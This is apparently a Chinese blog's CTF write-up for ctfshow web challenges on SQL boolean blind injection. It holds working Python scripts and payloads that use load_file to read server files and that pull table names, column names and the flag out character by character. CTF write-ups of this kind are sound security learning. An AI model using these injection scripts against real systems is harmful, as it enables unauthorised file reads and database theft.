+<p>让我们看看gpt怎么说<br>如果 ‘ctfshow{‘ 在 “&#x2F;var&#x2F;www&#x2F;html&#x2F;api&#x2F;index.php” 文件的内容中存在，并且位置大于 1（即找到了），那么条件表达式 locate(“ctfshow{“,’ + ‘load_file(“&#x2F;var&#x2F;www&#x2F;html&#x2F;api&#x2F;index.php”))&gt;1 将返回真，进入条件为真的分支，即返回 0。<br>接下来就是写脚本。<br>这个脚本最开始每太想出来怎么写，看了下大佬们的wp，才明白。这里会将wp中的脚本也列举出来。<br>脚本的思路就是，先搜索到flag的位置，然后一步一步给他读出来。<br>盲注需要找到回显的地方。<br>可以注意到，密码为0时，当账号为0，返回的是密码错误<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689075241167-f497b6be-cc54-40e6-8a25-06d580071436.png" alt="image.png"><br>当账号为1时，返回的是查询失败<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689075274763-4a0331a8-9216-4583-ae04-4d2e80f13121.png" alt="image.png"><br>勾<del>吧，payload测试一半不能用了，以为是写错了，重启靶场就好了。</del><br>用下面这个来看是什么字符</p>
+<pre class="language-python" data-language="python"><code class="language-python">if(substr(load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;api&#x2F;index.php&#39;),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),0,1)</code></pre>
+<p>勾吧题， wp很好理解，脚本写了三个小时整。<br>6点48开始写 9点48才写完。太抽象了<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689083298083-26b2335c-3036-4323-a955-54b23f46827f.png" alt="image.png"><br>python基础太差了，就这还是照着wp的解法写的。</p>
+<pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-
+&quot;&quot;&quot;
+@File    :   SQL布尔盲注.py
+@Contact :   2997453446@qq.com
+@Blog    :   natro92.github.io
+
+@Modify Time      @Author    @Version    @Desciption
+------------      -------    --------    -----------
+2023&#x2F;7&#x2F;11 18:48   natro92      1.0         None
+&quot;&quot;&quot;
+
+import string
+import requests
+
+url &#x3D; r&#39;http:&#x2F;&#x2F;2daeac7e-8170-4826-9997-2b4a8a6ec9ca.challenge.ctf.show&#x2F;api&#x2F;&#39;
+flag_pre &#x3D; &#39;ctfshow&#123;&#39;
+str1 &#x3D; &quot;abcdefghijklmnopqr-stuvwxyz0123456789&#123;&lt;&gt;$&#x3D;,;_ &#125;&quot;
+payload &#x3D; &#39;&#39;
+
+
+# 先找flag在哪：
+def find_flag():
+    left &#x3D; 0
+    right &#x3D; 1000  # 这里根据实际情况进行修改
+    while left &lt; right:
+        mid &#x3D; (left + right) &#x2F;&#x2F; 2  # &#x2F;&#x2F;floor整除
+        data &#x3D; &#123;
+            &#39;username&#39;: &#39;if(locate(&quot;&#39; + flag_pre + &#39;&quot;,load_file(&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;api&#x2F;index.php&quot;))&gt;&#123;&#125;,0,1)&#39;.format(mid),
+            &#39;password&#39;: &#39;0&#39;
+        &#125;
+        r &#x3D; requests.post(url, data&#x3D;data)
+        if &#39;密码错误&#39; in r.json()[&#39;msg&#39;]:
+            left &#x3D; mid + 1
+        else:
+            right &#x3D; mid
+    return int(mid)
+
+
+def get_flag(pos1, flag_pre1, stra):
+    pos1 +&#x3D; len(flag_pre1)+1
+    while 1:
+        for j in stra:
+            data &#x3D; &#123;
+                &#39;username&#39;: &quot;if(substr(load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;api&#x2F;index.php&#39;),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),0,1)&quot;.format(str(pos1), j),
+                &#39;password&#39;: &#39;0&#39;
+            &#125;
+            r &#x3D; requests.post(url, data&#x3D;data)
+            # print(data)
+            # print(r.json()[&#39;msg&#39;])
+            if &#39;密码错误&#39; in r.json()[&#39;msg&#39;]:
+                flag_pre1 +&#x3D; j
+                pos1 +&#x3D; 1
+                break
+            if j &#x3D;&#x3D; &#39;&#125;&#39;:
+                exit()
+        print(flag_pre1)
+    return flag_pre1
+
+pos &#x3D; find_flag()
+print(get_flag(pos, flag_pre, str1))</code></pre>
+<h2 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h2><p>这里面payload是不能使用单引号的，单引号会导致前面闭合以至于不能够查询。要使用双引号。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689075867993-0f9922b1-6204-4e3a-842a-5063ace97744.png" alt="image.png"></p>
+<h1 id="web190"><a href="#web190" class="headerlink" title="web190"></a>web190</h1><p>在查询语句里面加了单引号<code>username = &#39;&#123;$username&#125;&#39;</code><br>不用读文件了，直接就读数据就可以。<br>payload：<br><code>username=admin&#39;||1||&#39;</code><br>那就可以把上面那个payload去掉第一段方法。<br>找到布尔盲注构造位置：<br><code>username=admin&#39;and+0#&amp;password=0</code>：<br>返回用户名不存在<br><code>username=admin&#39;and+1#&amp;password=0</code>：<br>返回密码错误<br>由此编写脚本：（20min）</p>
+<pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-
+&quot;&quot;&quot;
+@File    :   SQL布尔盲注2.py   
+@Contact :   2997453446@qq.com
+@Blog    :   natro92.github.io
+ 
+@Modify Time      @Author    @Version    @Desciption
+------------      -------    --------    -----------
+2023&#x2F;7&#x2F;11 22:02   natro92      1.0         None
+&quot;&quot;&quot;
+import string
+import requests
+
+
+url &#x3D; r&#39;http:&#x2F;&#x2F;96880f33-872c-4e26-9e91-a87d096bb6e2.challenge.ctf.show&#x2F;api&#x2F;&#39;
+flag_pre &#x3D; &#39;ctfshow&#123;&#39;
+str1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$&#x3D;,;_ -&#125;&quot;
+# payload &#x3D; &quot;admin&#39;and+if(substr(database(),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;
+payload &#x3D; &quot;admin&#39;and+if(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;
+res &#x3D; &#39;&#39;
+
+for i in range(1,100):
+    for j in str1:
+        data &#x3D; &#123;
+            &#39;username&#39;: payload.format(i, j),
+            &#39;password&#39;: &#39;0&#39;
+        &#125;
+        r &#x3D; requests.post(url, data&#x3D;data)
+        # print(data)
+        # print(r.json()[&#39;msg&#39;])
+        if &#39;密码错误&#39; in r.json()[&#39;msg&#39;]:
+            res +&#x3D; j
+            print(res)
+            break
+        if j &#x3D;&#x3D; &#39;&#125;&#39;:
+            exit()
+</code></pre>
+<p>分别修改payload参数可以得到需要的名称：</p>
+<pre class="language-python" data-language="python"><code class="language-python">payload &#x3D; &quot;admin&#39;and+if(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;</code></pre>
+<p><code>ctfshow_fl0g,ctfshow_user</code></p>
+<pre class="language-python" data-language="python"><code class="language-python">payload &#x3D; &quot;admin&#39;and+if(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_fl0g&#39;),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;</code></pre>
+<p><code>id,f1ag</code></p>
+<pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-
+&quot;&quot;&quot;
+@File    :   SQL布尔盲注2.py   
+@Contact :   2997453446@qq.com
+@Blog    :   natro92.github.io
+ 
+@Modify Time      @Author    @Version    @Desciption
+------------      -------    --------    -----------
+2023&#x2F;7&#x2F;11 22:02   natro92      1.0         None
+&quot;&quot;&quot;
+import string
+import requests
+import time
+
+
+url &#x3D; r&#39;http:&#x2F;&#x2F;96880f33-872c-4e26-9e91-a87d096bb6e2.challenge.ctf.show&#x2F;api&#x2F;&#39;
+flag_pre &#x3D; &#39;ctfshow&#123;&#39;
+str1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$&#x3D;,;_ -&#125;&quot;
+# payload &#x3D; &quot;admin&#39;and+if(substr(database(),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;
+# payload &#x3D; &quot;admin&#39;and+if(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_fl0g&#39;),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;
+payload &#x3D; &quot;admin&#39;and+if(substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;
+res &#x3D; &#39;&#39;
+
+for i in range(1,100):
+    for j in str1:
+        data &#x3D; &#123;
+            &#39;username&#39;: payload.format(i, j),
+            &#39;password&#39;: &#39;0&#39;
+        &#125;
+        r &#x3D; requests.post(url, data&#x3D;data)
+        # print(data)
+        # print(r.json()[&#39;msg&#39;])
+        if &#39;密码错误&#39; in r.json()[&#39;msg&#39;]:
+            res +&#x3D; j
+            print(res)
+            break
+            time.sleep(0.3)
+        if j &#x3D;&#x3D; &#39;&#125;&#39;:
+            exit()
+</code></pre>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果脚本编写异常，</p>
+<pre class="language-python" data-language="python"><code class="language-python">print(data)
+print(r.json()[&#39;msg&#39;])</code></pre>
+<p>这俩玩应是非常有用的。<br>如果由于因为太快导致的json报错，可以手动加一行休眠</p>
+<pre class="language-python" data-language="python"><code class="language-python">import time 
+time.sleep(0.3)</code></pre>
+<p>即可</p>
+
+                        </article>
+                    </div>
+
+
+                    <div class="fleet-content-body-footer">
+                        <!--翻页器-->
+                        <div class="flex-row flex w-full justify-between">
+                            <div class="fleet-content-body-footer-left">
+                                
+                                    <div><a href="/posts/84a9ce9a/"
+                                            class="btn btn-sm md:btn-md gap-2 lg:gap-3">
+                                            <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
+                                                 xmlns="http://www.w3.org/2000/svg"
+                                                 width="24" height="24" viewBox="0 0 24 24">
+                                                <path d="M15.41,16.58L10.83,12L15.41,7.41L14,6L8,12L14,18L15.41,16.58Z"></path>
+                                            </svg>
+                                            <div class="flex flex-col items-start"><span
+                                                        class="text-base-content/50 hidden text-xs font-normal md:block">上一篇</span>
+                                                <span>web191-w</span></div>
+                                        </a></div>
+                                
+                            </div>
+                            <div class="fleet-content-body-footer-right">
+                                
+                                    <div><a href="/posts/b65adfd/"
+                                            class="btn btn-neutral btn-sm md:btn-md gap-2 lg:gap-3">
+                                            <div class="flex flex-col items-end"><span
+                                                        class="text-neutral-content/50 hidden text-xs font-normal md:block">下一篇</span>
+                                                <span>使用Python脚本修改语雀导文件图片格式</span></div>
+                                            <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
+                                                 xmlns="http://www.w3.org/2000/svg"
+                                                 width="24" height="24" viewBox="0 0 24 24">
+                                                <path d="M8.59,16.58L13.17,12L8.59,7.41L10,6L16,12L10,18L8.59,16.58Z"></path>
+                                            </svg>
+                                        </a></div>
+
+                                
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+</div>
+
+    <!--    嵌套位置结束-->
+
+
+
+
+
+    <!--<h3>categories</h3>-->
+    <!--<ul>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/categories/CTF/">-->
+    <!--                CTF-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/categories/Python/">-->
+    <!--                Python-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--</ul>-->
+
+    <!--<h3>tags</h3>-->
+    <!--<ul>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/WriteUp/">-->
+    <!--                WriteUp-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/CISCN/">-->
+    <!--                CISCN-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/valorant/">-->
+    <!--                valorant-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/genshin/">-->
+    <!--                genshin-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/Shortcut/">-->
+    <!--                Shortcut-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/%E8%AF%AD%E9%9B%80/">-->
+    <!--                语雀-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/%E8%84%9A%E6%9C%AC/">-->
+    <!--                脚本-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/CTFshow0-1/">-->
+    <!--                CTFshow0-1-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/Tampermonkey/">-->
+    <!--                Tampermonkey-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--</ul>-->
+</div>
+<!--返回顶部按钮-->
+<button class="backToTopBtn btn" title="返回顶部">&#8593;</button>
+<!--加个渐变，但还是有点丑-->
+<!-- TODO 换个更好的方案-->
+<div class="h-1 bg-gradient-to-t from-base-content to-base-100">
+</div>
+
+<footer class="footer p-10 bg-neutral text-neutral-content">
+    <aside>
+        <svg width="50" height="50" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" clip-rule="evenodd" class="fill-current mt-3"><path d="M22.672 15.226l-2.432.811.841 2.515c.33 1.019-.209 2.127-1.23 2.456-1.15.325-2.148-.321-2.463-1.226l-.84-2.518-5.013 1.677.84 2.517c.391 1.203-.434 2.542-1.831 2.542-.88 0-1.601-.564-1.86-1.314l-.842-2.516-2.431.809c-1.135.328-2.145-.317-2.463-1.229-.329-1.018.211-2.127 1.231-2.456l2.432-.809-1.621-4.823-2.432.808c-1.355.384-2.558-.59-2.558-1.839 0-.817.509-1.582 1.327-1.846l2.433-.809-.842-2.515c-.33-1.02.211-2.129 1.232-2.458 1.02-.329 2.13.209 2.461 1.229l.842 2.515 5.011-1.677-.839-2.517c-.403-1.238.484-2.553 1.843-2.553.819 0 1.585.509 1.85 1.326l.841 2.517 2.431-.81c1.02-.33 2.131.211 2.461 1.229.332 1.018-.21 2.126-1.23 2.456l-2.433.809 1.622 4.823 2.433-.809c1.242-.401 2.557.484 2.557 1.838 0 .819-.51 1.583-1.328 1.847m-8.992-6.428l-5.01 1.675 1.619 4.828 5.011-1.674-1.62-4.829z"></path></svg>
+        © 2020-2024 Lupas by Natro92
+        <pre class="whitespace-pre-line">框架 <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/">Hexo</a> | 主题 <a target="_blank" rel="noopener" href="https://www.example.com">Lupas</a></pre>
+    </aside>
+    <nav>
+        <header class="footer-title">Social</header>
+        <!--<div class="grid grid-flow-col gap-4">-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z"></path></svg></a>-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z"></path></svg></a>-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M9 8h-3v4h3v12h5v-12h3.642l.358-4h-4v-1.667c0-.955.192-1.333 1.115-1.333h2.885v-5h-3.808c-3.596 0-5.192 1.583-5.192 4.615v3.385z"></path></svg></a>-->
+        <!--</div>-->
+    </nav>
+</footer>
+</body>
+
+</html>
+
+
